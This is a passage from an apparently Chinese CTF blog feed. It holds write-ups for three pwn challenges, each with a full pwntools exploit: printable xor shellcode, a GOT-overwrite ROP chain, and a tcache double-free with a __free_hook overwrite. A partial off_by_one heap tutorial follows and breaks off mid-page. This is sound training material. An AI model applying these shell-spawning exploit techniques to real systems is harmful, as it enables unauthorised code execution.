    <content type="html"><![CDATA[<h2 id="1-5"><a href="#1-5" class="headerlink" title="1!5!"></a>1!5!</h2><h3 id="题目保护情况"><a href="#题目保护情况" class="headerlink" title="题目保护情况"></a><strong>题目保护情况</strong></h3><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727141614221.png" alt="image-20240727141614221.png"></p><h3 id="64位ida逆向"><a href="#64位ida逆向" class="headerlink" title="64位ida逆向"></a><strong>64位ida逆向</strong></h3><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727151036170.png" alt="image-20240727151036170"></p><p>题目很明确让我们写shellcode，但是做了一些检查我们进入函数看看</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727151137542.png" alt="image-20240727151137542"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>那么思路很明确就是<strong>可见字符shellcode的编写</strong>，先看看我们能用什么</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727151420684.png" alt="image-20240727151420684"></p><p>那么可以看见，我们可以用异或，没有pop rsi;pop rdi；还有syscall等命令可以用，pop rdi的机器码是<strong>\x5f,<strong>而pop rsi的机器码是</strong>\x5e</strong>,syscall的机器码是<strong>\x0f\x05</strong>,这些虽然都不能直接输入，但是我们可以通过异或（xor）来得到他们，例如syscall，可以通过</p><p>\x41\x41和\x4e\x44来得到syscall</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727152321660.png" alt="image-20240727152321660"></p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727152421298.png" alt="image-20240727152421298"></p><p>因为是小端序所以实际写入的时候写0x444e，那么还有一个问题想要用相同的方法得到pop rdi，和pop rsi，比较容易，如果是&#x2F;bin&#x2F;sh呢，而且本题限制的可见数字字符也比较多，所以<strong>思路是通过调用一个syscall_read来读取我们正常的shellcode</strong>，因为此时已经不用通过检查了，那么就可以得到shell了。</p><p>那么继续现在还有rdx,和rax还没有解决，可以先调试到要执行代码的地方看看栈和寄存器的值</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727153313531.png" alt="image-20240727153313531"></p><p>那么可以看见此时rax正好是0，rdx的值是我们输入shellocde的地址，那么我们可以把rdx 和rax push到栈上然后分别pop给rdi和rsi，那么就可以完成系统调用read。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>通过xor，异或出syscall和pop rdi 和 rsi 放在rdx+某处的地方，然后一直pop rax（rax置为0）滑到执行push rdx 和push rax的地方最后执行sysacll</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155125080.png" alt="image-20240727155125080"></p><h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./22sh&#x27;</span>)<br><br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">xor eax,0x31315756</span><br><span class="hljs-string">xor dword ptr[rdx+0x50],eax</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor eax,0x31314848</span><br><span class="hljs-string">xor dword ptr[rdx+0x50],eax</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor eax,0x3131444e</span><br><span class="hljs-string">xor dword ptr[rdx+0x52],eax</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment">#gdb.attach(io)</span><br>io.send((asm(shellcode).ljust(<span class="hljs-number">0x50</span>-<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;\x58&#x27;</span>)+<span class="hljs-string">b&#x27;\x52\x50&#x27;</span>+<span class="hljs-string">b&#x27;\x41&#x27;</span>*<span class="hljs-number">4</span>).ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x58&#x27;</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(asm(shellcode)))<br><br>payload = <span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x100</span> + asm(shellcraft.sh())<br>io.send(payload)<br><br><br><br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="R-P"><a href="#R-P" class="headerlink" title="R()P"></a>R()P</h2><h3 id="程序保护情况"><a href="#程序保护情况" class="headerlink" title="程序保护情况"></a>程序保护情况</h3><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155253935.png" alt="image-20240727155253935"></p><h3 id="64位ida逆向-1"><a href="#64位ida逆向-1" class="headerlink" title="64位ida逆向"></a>64位ida逆向</h3><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155403448.png" alt="image-20240727155403448"></p><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>题目逻辑比较简单，大致让你上来输入一个4字节数据不能大于0x100，然后根据你输入的大小进行读入buf（buf大小0xc）有溢出，那么找一下gadget什么的</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155649490.png" alt="image-20240727155649490"></p><p>那么很不幸的是没有pop rdi 那一类的gadget给我们用，只能到程序去找了</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727155808525.png" alt="image-20240727155808525"></p><p>看到这些想到了什么，syscall对吧，那么程序也没有syscall的onegadget给我们，那么还有一种思路就是修改read的got表，因为调用read的时候其实底层是通过系统调用来执行syscall_read的</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727160203968.png" alt="image-20240727160203968"></p><p>那么可以看见，就差一个字节就可以<strong>把read的got表换成syscall</strong>，那么怎么改呢？还记得前面说的，我们可以控制rsi，那么就可以实现任意地址写了，那么现在还有一个问题，rdi怎么办，如果要实现系统调用拿到shell，是需要rdi为&#x2F;bin&#x2F;sh的或者sh的，那么我们可以写入&#x2F;bin&#x2F;sh,那么我们看看有没有关于rdi的gadget</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727160516271.png" alt="image-20240727160516271"></p><p>那么我们找的一个edi的gadget,那么我们只需要把&#x2F;bin&#x2F;sh写入0x404018即可，然后跳到rax，那么就要保证rax是一个可以执行的地址。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>改read@got为syscall，将&#x2F;bin&#x2F;sh写入0x404018中，然后依次控制，rdx，rdi，rax，rsi，因为要控制rdx的时候rdi会被清0，所以要按着顺序来，最后得到shell。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>io = process(<span class="hljs-string">&#x27;./rpp&#x27;</span>)<br>elf =ELF(<span class="hljs-string">&#x27;./rpp&#x27;</span>)<br>size = <span class="hljs-string">b&#x27;\x00\x01\x00\x00&#x27;</span><br>gdb.attach(io)<br>io.send(size)<br><br>ret = <span class="hljs-number">0x40115A</span><br>mov_edi_jmp = <span class="hljs-number">0x0000000000401099</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> +p32(elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) +<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">4</span> +<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">4</span>+ p64(ret)<br>payload += p64(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x404018</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xdeadbeef</span>)+p64(ret)<br>io.send(payload)<br>pause()<br>io.send(<span class="hljs-string">&#x27;\xe0&#x27;</span>)<br>pause()<br>io.send(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>pause()<br>io.send(size)<br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span> + p32(<span class="hljs-number">0x40116D</span>) + <span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">4</span> +<span class="hljs-string">b&#x27;d&#x27;</span>*<span class="hljs-number">4</span> + p64(<span class="hljs-number">0x40115D</span>)<br>payload += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x40116D</span>) + p64(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x40116D</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xdeadbeef</span>) + p64(mov_edi_jmp)<br>payload += p64(<span class="hljs-number">0xdeadbeef</span>) + p32(<span class="hljs-number">0x3b</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0xdeadbeef</span>)  + p64(<span class="hljs-number">0x401141</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br><br><br>io.send(payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="Magic-Book"><a href="#Magic-Book" class="headerlink" title="Magic_Book"></a>Magic_Book</h2><h3 id="程序保护情况-1"><a href="#程序保护情况-1" class="headerlink" title="程序保护情况"></a>程序保护情况</h3><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161116505.png" alt="image-20240727161116505"></p><h3 id="64位ida载入"><a href="#64位ida载入" class="headerlink" title="64位ida载入"></a>64位ida载入</h3><p>首先最引入注意的是有一次<strong>UAF</strong>的机会</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161233654.png" alt="image-20240727161233654"></p><p>add最多申请18个堆块，然后最大不超过0x100</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161357899.png" alt="image-20240727161357899"></p><p>然后还有正常的free，没有UAF</p><p><img src="/2024/07/27/DASCTF%20X%20GFCTF%202022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-PWN-WP/image-20240727161442747.png" alt="image-20240727161442747"></p><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>虽然有UAF，但是本题版本是2.31的，我们知道在2.29之后的glibc，对double_free增加了一个检查机制，也就是key机制，它保存在bk指针处，它的值是tcache_perthread_struct，在free的时候如果发现链表中存在这个堆块那么就会报错。并且本题没有show功能，如果要泄露libc，可以考虑打io去爆破。</p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过申请堆块7让接下来要double_free的堆块进入unsortebin，那么它bk指针的key就被修改了，然后在free一次让他加入tachbin链表中，那么实现了一个堆块即在unsortbin中又在tachbin链表中，然后通过申请堆块改变tachbin堆块的fd指针实现leak libc，然后可以继续修改unsortbin头部的大小进行向下申请（注意要伪造prev size），修改下一个fd指针为free_hook，进而通过申请修改为system。</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>有个小点，就是需要两条tachbin链，因为第一次leak libc已经破坏了一个了，所以接下来还需要另一条链来完成接下来的操作，还要一个就是进入unsortbin的时候先free高地址的，然后free低地址，这样会合并，然后继续伪造堆块延长unsortbin，使其可以渗透进tachbin中</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br><span class="hljs-comment">#io = process(&#x27;./book&#x27;)</span><br>libc = ELF(<span class="hljs-string">&#x27;/home/su/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,msg</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice : &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,msg)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice : &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">uaf</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&#x27;choice : &#x27;</span>,<span class="hljs-string">&#x27;9&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>  add(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#0</span><br>  add(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-comment">#1</span><br>  add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;c&#x27;</span>)  <span class="hljs-comment">#2</span><br>  payload = p64(<span class="hljs-number">0xdeadbeef</span>) * <span class="hljs-number">14</span> + p64(<span class="hljs-number">0x180</span>) + p64(<span class="hljs-number">0x90</span>)<br>  add(<span class="hljs-number">0x100</span>,payload) <span class="hljs-comment">#3</span><br><br>  <span class="hljs-comment">#gdb.attach(io)</span><br>  <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>      add(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <br><br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>,<span class="hljs-number">10</span>):<br>      free(i)<br>  <span class="hljs-comment">#gdb.attach(io)</span><br>  uaf(<span class="hljs-number">1</span>)<br>  free(<span class="hljs-number">0</span>)<br>  add(<span class="hljs-number">0x100</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#10</span><br>  free(<span class="hljs-number">1</span>)<br>  add(<span class="hljs-number">0x70</span>,<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-comment">#11</span><br>  add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;b&#x27;</span>) <span class="hljs-comment">#12</span><br>  payload = <span class="hljs-string">b&#x27;\xa0\x56&#x27;</span><br>  <span class="hljs-comment">#gdb.attach(io)</span><br>  add(<span class="hljs-number">0x90</span>,payload) <span class="hljs-comment">#13</span><br><br>  payload = p64(<span class="hljs-number">0xdeadbeef</span>) *<span class="hljs-number">18</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x180</span>)<br>  add(<span class="hljs-number">0x100</span>,payload) <span class="hljs-comment">#14</span><br>  payload = p64(<span class="hljs-number">0xfbad1887</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x08&#x27;</span><br>  add(<span class="hljs-number">0x100</span>,payload) <span class="hljs-comment">#15</span><br>  libc_base = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1c6980</span><br>  <span class="hljs-comment">#pause()</span><br>  <span class="hljs-keyword">if</span> (libc_base &amp; <span class="hljs-number">0xfff</span>) != <span class="hljs-number">0</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>  success(<span class="hljs-string">&#x27;libc_base----&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>  free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>] - <span class="hljs-number">0x25000</span><br>  system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>] - <span class="hljs-number">0x25000</span><br>  free(<span class="hljs-number">12</span>)<br>  free(<span class="hljs-number">2</span>)<br><br>  payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x60</span> + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0x90</span>) + p64(free_hook)<br>  add(<span class="hljs-number">0xb0</span>,payload) <span class="hljs-comment">#16</span><br>  add(<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>) <span class="hljs-comment">#17</span><br>  add(<span class="hljs-number">0x80</span>,p64(system))<br>  free(<span class="hljs-number">17</span>)<br>  io.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">try</span>:<br>        io = process(<span class="hljs-string">&#x27;./book&#x27;</span>)<br>        <span class="hljs-keyword">if</span> pwn():<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">except</span>:<br>        io.close()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>赛题WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>赛题复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>常回家看看之off_by_one</title>
    <link href="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/"/>
    <url>/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/</url>
    
    <content type="html"><![CDATA[<p><strong>❗off_by_one</strong>这个漏洞<strong>比较特殊，</strong>它不像上一期的<strong>堆溢出，可以溢出很多字节，它只能溢出一个字节，</strong>在栈里面也可以通过这个漏洞修改返回地址什么的，在堆里面我们主要利用它来修改<strong>堆块的大小</strong>，<strong>形成fake_chunk也就可以进行堆的重叠</strong>，在64位的时候如果申请0x18，0x28，0x38这样的堆它的size位是0x21，0x31和0x41，那为什么，头部0x10加申请的0x18大小已经是0x28大小了为啥size还是0x21，<strong>别忘了，当上一个chunk正在使用的时候下一个chunk的prev_size位也拿来当我们的数据部分。</strong></p><p><strong>那么我们就可以利用这个特性来进行off_by_one,那样就可以修改下一个chunk的size位。</strong></p><p><strong>我们拿一道题目来具体复现一下这个漏洞。✅</strong></p><p><strong>题目链接：<a href="https://pan.baidu.com/s/1BBT95PNOuffZv1r_1Cacbg?pwd=kj9t">https://pan.baidu.com/s/1BBT95PNOuffZv1r_1Cacbg?pwd&#x3D;kj9t </a><br>提取码：kj9t</strong></p><p><strong>1.养成好习惯首先看保护</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520190845849-524487537.png" alt="3419447-20240520190845849-524487537"></p><p><strong>2.不如不看🙃，哈哈，开玩笑的，保护全开，但是不要慌，对于堆题目这很正常，我们用64位ida看一下</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520191026288-169896448.png" alt="3419447-20240520191026288-169896448"></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520191446287-2046407423.png" alt="3419447-20240520191446287-2046407423"></p><p><strong>3.还是一些功能函数，add添加chunk</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520191840903-1267124445.png" alt="3419447-20240520191840903-1267124445"></p><p><strong>4.edit函数</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520191929824-1611380561.png" alt="3419447-20240520191929824-1611380561"></p><p><strong>这里主要在输入size的时候进行了一次判断，就是sub_E3A这个函数</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520192030882-1418484235.png" alt="3419447-20240520192030882-1418484235"></p><p><strong>如果输入的size减去申请chunk的size等于10的话会返回a1加1，也就是我们在chunk size的基础上可以多输入一个字节，满足off_by_one</strong></p><p><strong>5.show函数和delete函数</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520192550050-333329489.png" alt="3419447-20240520192550050-333329489"></p><p><strong>我们先申请两个chunk，第一个是0x18,0x28,0x38之类的</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520193129898-1477590147.png" alt="3419447-20240520193129898-1477590147"></p><p><strong>现在编辑第一个堆进行溢出一个字节修改下一个chunk的size位</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520193309126-1467934739.png" alt="3419447-20240520193309126-1467934739"></p><p><strong>修改之前</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520193407886-1794926709.png" alt="3419447-20240520193407886-1794926709"></p><p><strong>修改之后</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520193451595-1235718211.png" alt="3419447-20240520193451595-1235718211"></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520193748168-1655975698.png" alt="3419447-20240520193748168-1655975698"></p><p><strong>注意此时虽然修改成功了，但是堆结构被我们破坏了，top chunk距离上一个chunk距离不是0x40了，所以我们继续申请一个堆，来恢复堆结构</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520194517228-463098578.png" alt="3419447-20240520194517228-463098578"></p><p><strong>恢复之后此时堆结构</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520201940088-463770924.png" alt="3419447-20240520201940088-463770924"></p><p><strong>之后我们把chunk1 free掉</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520202410554-1350812995.png" alt="3419447-20240520202410554-1350812995"></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520202841301-1425173380.png" alt="3419447-20240520202841301-1425173380"></p><p><strong>我们再次申请回来，发现原来的0x91不见了</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520203216796-374983126.png" alt="3419447-20240520203216796-374983126"></p><p><strong>那么我们再次构造unsortbin chunk</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520203336285-12755324.png" alt="3419447-20240520203336285-12755324"></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520203512640-591901248.png" alt="3419447-20240520203512640-591901248"></p><p><strong>我们free2 的时候就会得到unsortbin，但是记得再申请一个堆，不然free的时候会和top chunk合并</strong></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520203653485-1583472558.png" alt="3419447-20240520203653485-1583472558"></p><p><img src="/2024/06/22/%E5%B8%B8%E5%9B%9E%E5%AE%B6%E7%9C%8B%E7%9C%8B%E4%B9%8Boff_by_one/3419447-20240520203920652-1686364780.png" 